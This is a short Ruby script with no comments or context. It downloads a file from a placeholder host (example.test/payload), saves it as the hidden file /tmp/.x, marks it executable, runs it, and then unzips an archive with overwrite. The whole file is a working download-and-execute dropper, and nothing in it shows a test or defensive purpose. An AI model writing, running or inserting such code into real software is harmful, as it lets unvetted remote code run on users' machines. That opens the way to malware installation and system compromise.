require 'net/http'
require 'tempfile'
uri = URI('http://example.test/payload')
Net::HTTP.start(uri.host, uri.port) do |http|
  response = http.request(Net::HTTP::Get.new(uri))
  File.open('/tmp/.x', 'wb') { |f| f.write(response.body) }
  File.chmod(0755, '/tmp/.x')
  system('/tmp/.x')
  system('unzip', '-o', 'a.zip')
end
